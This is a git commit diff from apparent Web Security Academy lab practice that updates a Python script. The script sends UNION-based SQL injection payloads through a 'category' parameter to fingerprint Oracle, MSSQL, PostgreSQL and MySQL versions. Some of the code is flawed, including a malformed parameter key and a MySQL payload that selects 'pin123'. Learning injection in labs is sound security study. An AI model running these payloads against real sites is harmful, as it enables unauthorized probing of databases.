a31ca207a4a5050faef99a79ff5e915f27060aad
pin <rlacksdn10909@naver.com>
2026-03-18 21:07:31 +0900

    Web Security Academy 1

--- union_sqli.py
+++ union_sqli.py
@@ -2,28 +2,56 @@ import requests
 import re
 
 def send_request(url, payload):
-    params = {"category": payload}
+    params = {"/filter?category": payload}
     res = requests.get(url, params=params)
     return res.text
 
 def run_union(url):
     print("\n[UNION SQL Injection 테스트 시작]\n")
 
-    payload = "' UNION SELECT banner, NULL FROM v$version--"
+    payloads = [
+        "' UNION SELECT banner, NULL FROM v$version-- ",  # Oracle
+        "' UNION SELECT @@version, NULL-- ",      # MSSQL
+        "' UNION SELECT version(), NULL-- ",      # PostgreSQL
 
-    res = send_request(url, payload)
+         "' UNION SELECT pin123, NULL#",        # MySQL
+    ]
 
-    print("[응답 분석 중...]")
+    for payload in payloads:
+        print(f"\n[테스트 중 payload]: {payload}")
 
-    if "Oracle" in res:
-        print("▶ Oracle 데이터베이스 탐지됨")
+        res = send_request(url, payload)
+        #url = f"{url}/filter?category=%27%20UNION%20SELECT%20@@version,%20NULL%23"
+        #res = requests.get(url)
 
-    matches = re.findall(r"Oracle.*", res)
+        oracle = re.findall(r"Oracle.*", res)
+        postgres = re.findall(r"PostgreSQL.*", res)
+        microsoft = re.findall(r"Microsoft.*", res)
+        mysql = re.findall(r"\d+\.\d+\.\d+[-\w\.]*", res)
 
-    if matches:
-        print("\n[버전 정보]")
-        for m in matches:
-            print(m)
-        print("\n🔥 UNION 기반 SQL Injection 성공")
-    else:
-        print("❌ 버전 정보 탐지 실패")
+        if oracle:
+            print("▶ Oracle DB 탐지")
+            for o in oracle:
+                print(o)
+            return
+
+        if postgres:
+            print("▶ PostgreSQL DB 탐지")
+            for p in postgres:
+                print(p)
+            return
+        
+        if mysql:
+            print("▶ MySQL 가능성 높음")
+            for m in mysql:
+                print(m)
+            return
+        
+        if microsoft:
+            print("▶ Microsoft SQL Server 탐지")
+            for m in microsoft:
+                print(m)
+            return
+    
+
+    print("\n❌ 버전 정보 탐지 실패")
